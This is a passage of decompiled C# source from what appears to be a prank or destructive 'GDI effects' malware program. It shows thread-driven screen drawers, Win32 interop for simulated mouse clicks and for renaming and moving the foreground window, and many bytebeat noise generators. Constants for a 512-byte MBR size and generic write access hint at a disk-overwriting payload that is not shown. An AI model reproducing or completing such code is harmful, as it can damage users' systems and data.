				Thread.Sleep(base.random.Next(15000));
				drawer14.Stop();
				break;
			case 6:
				drawer15.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer15.Stop();
				break;
			case 5:
				drawer16.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer16.Stop();
				break;
			case 4:
				drawer17.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer17.Stop();
				break;
			case 3:
				drawer18.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer18.Stop();
				break;
			case 2:
				drawer19.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer19.Stop();
				break;
			case 1:
				drawer20.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer20.Stop();
				break;
			}
		}
	}

	public struct _BLENDFUNCTION
	{
		public byte BlendOp;

		public byte BlendFlags;

		public byte SourceConstantAlpha;

		public byte AlphaFormat;
	}

	public struct POINT
	{
		public int X;

		public int Y;

		public POINT(int x, int y)
		{
			X = x;
			Y = y;
		}

		public static implicit operator Point(POINT p)
		{
			return new Point(p.X, p.Y);
		}

		public static implicit operator POINT(Point p)
		{
			return new POINT(p.X, p.Y);
		}
	}

	public enum TernaryRasterOperations
	{
		SRCCOPY = 13369376,
		SRCPAINT = 15597702,
		SRCAND = 8913094,
		SRCINVERT = 6684742,
		SRCERASE = 4457256,
		NOTSRCCOPY = 3342344,
		NOTSRCERASE = 1114278,
		MERGECOPY = 12583114,
		MERGEPAINT = 12255782,
		PATCOPY = 15728673,
		PATPAINT = 16452105,
		PATINVERT = 5898313,
		DSTINVERT = 5570569,
		BLACKNESS = 66,
		WHITENESS = 16711778
	}

	[Flags]
	public enum AllocationType
	{
		Commit = 0x1000,
		Reserve = 0x2000,
		Decommit = 0x4000,
		Release = 0x8000,
		Reset = 0x80000,
		Physical = 0x400000,
		TopDown = 0x100000,
		WriteWatch = 0x200000,
		LargePages = 0x20000000
	}

	[Flags]
	public enum MemoryProtection
	{
		Execute = 0x10,
		ExecuteRead = 0x20,
		ExecuteReadWrite = 0x40,
		ExecuteWriteCopy = 0x80,
		NoAccess = 1,
		ReadOnly = 2,
		ReadWrite = 4,
		WriteCopy = 8,
		GuardModifierflag = 0x100,
		NoCacheModifierflag = 0x200,
		WriteCombineModifierflag = 0x400
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct RGBQUAD
	{
		public byte rgbBlue;

		public byte rgbGreen;

		public byte rgbRed;

		public byte rgbReserved;

		public byte b;

		public byte g;

		public byte r;

		public byte a;
	}

	private struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	private struct BLENDFUNCTION
	{
		public byte BlendOp;

		public byte BlendFlags;

		public byte SourceConstantAlpha;

		public byte AlphaFormat;
	}

	private struct BITMAPINFOHEADER
	{
		public uint biSize;

		public int biWidth;

		public int biHeight;

		public ushort biPlanes;

		public ushort biBitCount;

		public uint biCompression;

		public uint biSizeImage;

		public int biXPelsPerMeter;

		public int biYPelsPerMeter;

		public uint biClrUsed;

		public uint biClrImportant;
	}

	private struct BITMAPINFO
	{
		public BITMAPINFOHEADER bmiHeader;

		public uint bmiColors;
	}

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private static Random random = new Random();

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 1;

	public const int AC_SRC_OVER = 0;

	private const uint GenericRead = 2147483648u;

	private const uint GenericWrite = 1073741824u;

	private const uint GenericExecute = 536870912u;

	private const uint GenericAll = 268435456u;

	private const uint FileShareRead = 1u;

	private const uint FileShareWrite = 2u;

	private const uint OpenExisting = 3u;

	private const uint FileFlagDeleteOnClose = 1073741824u;

	private const uint MbrSize = 512u;

	private const int BI_RGB = 0;

	private const int DIB_RGB_COLORS = 0;

	private const int SRCCOPY = 13369376;

	[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "ExtractIconExW", ExactSpelling = true)]
	private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

	public static Icon Extract(string file, int number, bool largeIcon)
	{
		ExtractIconEx(file, number, out var piLargeVersion, out var piSmallVersion, 1);
		try
		{
			return Icon.FromHandle(largeIcon ? piLargeVersion : piSmallVersion);
		}
		catch
		{
			return null;
		}
	}

	public static RGB HSLToRGB(HSL hsl)
	{
		byte b = 0;
		byte b2 = 0;
		byte b3 = 0;
		if (hsl.S == 0f)
		{
			b = (b2 = (b3 = (byte)(hsl.L * 255f)));
		}
		else
		{
			float num = (float)hsl.H / 360f;
			float num2 = (((double)hsl.L < 0.5) ? (hsl.L * (1f + hsl.S)) : (hsl.L + hsl.S - hsl.L * hsl.S));
			float v = 2f * hsl.L - num2;
			b = (byte)(255f * HueToRGB(v, num2, num + 1f / 3f));
			b2 = (byte)(255f * HueToRGB(v, num2, num));
			b3 = (byte)(255f * HueToRGB(v, num2, num - 1f / 3f));
		}
		return new RGB(b, b2, b3);
	}

	private static float HueToRGB(float v1, float v2, float vH)
	{
		if (vH < 0f)
		{
			vH += 1f;
		}
		if (vH > 1f)
		{
			vH -= 1f;
		}
		if (6f * vH < 1f)
		{
			return v1 + (v2 - v1) * 6f * vH;
		}
		if (2f * vH < 1f)
		{
			return v2;
		}
		if (3f * vH < 2f)
		{
			return v1 + (v2 - v1) * (2f / 3f - vH) * 6f;
		}
		return v1;
	}

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

	public static void DoMouseClick()
	{
		uint x = (uint)Cursor.Position.X;
		uint y = (uint)Cursor.Position.Y;
		mouse_event(6u, x, y, 0u, 0u);
	}

	[DllImport("user32.dll")]
	private static extern bool SetWindowText(IntPtr hWnd, string text);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

	public static int GetSomeRandomNumber(int min, int max)
	{
		if (random == null)
		{
			random = new Random();
		}
		return random.Next(min, max);
	}

	private static void byte1(int hz, int secs)
	{
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 2; i < array.Length; i++)
		{
			array[i] = (byte)((i * (((i / 2 >> 10) | (i % 16 * i >> 8)) & (82 * i >> 2) & 0x12)) | (-(i / 16) + 64));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte2(int hz, int secs)
	{
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((i * i + 22) / ((i >> 6) + 23));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte3(int hz, int secs)
	{
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(((91 * i) & (i >> 9)) | ((15 * i) & (i >> 17)) | (((3 * i) & (i >> 5)) - 1));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte4(int hz, int secs)
	{
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((uint)(i * (((i >> 27) | (i >> 13)) & 0x97)) & 0x81u);
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte5(int hz, int secs)
	{
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(((((i >> 28) ^ ((i >> 29) - 1) ^ 0xC) % 123 * i) & 0xE7) * (12 + (i >> 9)));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte6(int hz, int secs)
	{
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		int num3 = random.Next(1, 8);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(i * (i ^ (i + ((i >> 15) | 1)) ^ (((i - 12180) ^ i) >> 10)));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte7(int hz, int secs)
	{
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(430 * ((51 * i >> 11) | (51 * i >> 4)));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte8(int hz, int secs)
	{
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		int num3 = random.Next(8);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(128.0 * Math.Sin(129 * (i >> 10)) + 128.0 * Math.Sin(i * i * i));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte9(int hz, int secs)
	{
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(10 * ((i >> 4) | i | (i >> (i >> 8))) + (0x25 & (i >> 17)));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte10(int hz, int secs)
	{
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((1 + (i >> 3) % 811 + (i >> 31) % 3) * i >> 10);
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte11(int hz, int secs)
	{
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((((i >> 3) & 1) * i >> 4) ^ (i / 11118 * i));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte12(int hz, int secs)
	{
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((((((i / 8100) | 0x65) * i) & 0x32F) - i) & (i / 41));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte13(int hz, int secs)
	{
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(i * (31 + (1 ^ ((i >> 11) & 5))) * (5 + (3 & (i >> 14))) >> (i >> 1));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte14(int hz, int secs)
	{
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((((((i / 8100) | 0x6E) * i) & 0x32F) - i) & (i / 41));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte15(int hz, int secs)
	{
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(i >> i / (1 + (i >> 1) % 16) * (1 + (3 & (i >> 13))) >> (2 & (i >> 11)));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte16(int hz, int secs)
	{
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((((91 * i) & (i >> 1)) | ((5 * i) & (i >> 7)) | ((31 * i) & (i >> 14))) - 11);
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte17(int hz, int secs)
	{
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(128 * (("2230290303535332929303030290302218182211"[(i >> 12) % 32] * i) & 0x778) / 21 + (("020202030"[(i >> 3) % 8] * i >> 1) & 0x80) + 2128);
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte18(int hz, int secs)
	{
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
